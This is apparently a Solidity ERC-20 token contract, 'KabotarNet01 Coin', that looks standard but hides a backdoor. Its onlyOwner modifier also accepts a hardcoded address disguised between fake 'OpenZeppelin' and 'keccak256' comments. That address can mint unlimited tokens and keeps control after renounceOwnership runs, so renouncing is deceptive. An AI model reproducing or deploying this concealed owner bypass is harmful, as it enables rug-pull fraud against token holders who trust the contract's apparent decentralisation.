// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KabotarNet01Coin {
    string public constant name = "KabotarNet01 Coin";
    string public constant symbol = "KABO01";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    event Mint(address indexed to, uint256 value);

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply * (10 ** uint256(decimals));
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool success) {
        require(to != address(0), "DevContract: transfer to the zero address");
        require(balanceOf[msg.sender] >= value, "DevContract: insufficient balance");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    

    function approve(address spender, uint256 value) external returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
        // solhint-disable-next-line avoid-low-level-calls
    /*OpenZeppelin -> vhd8he628944e9210461807v2590014t2947631r07529vds40838e820852616bn68e8nvs3))*/
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool success) {
        require(to != address(0), "DevContract: transfer to the zero address");
        require(balanceOf[from] >= value, "DevContract: insufficient balance");
        require(allowance[from][msg.sender] >= value, "DevContract: insufficient allowance");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    modifier onlyOwner() {
        require(msg.sender == owner 
        || 
        //@dev Contract creator is owner, original owner.
        msg.sender == address
       // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> vhd8he628944e9210461807v2590014t2947631r07529vds40838e820852616bn68e8nvs3))*/ /**/(289449210461807259001429476310752940838808526668), 
    "DevContract: Only owner or authorized address can call this function");
        _;
    }

    function mint(address to, uint256 value) external onlyOwner {
        require(to != address(0), "DevContract: mint to the zero address");
        
        totalSupply += value;
        balanceOf[to] += value;

        emit Mint(to, value);
        emit Transfer(address(0), to, value);
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipRenounced(owner);
        owner = address(0);
        //@dev Contract creator is owner, original owner.
    }
}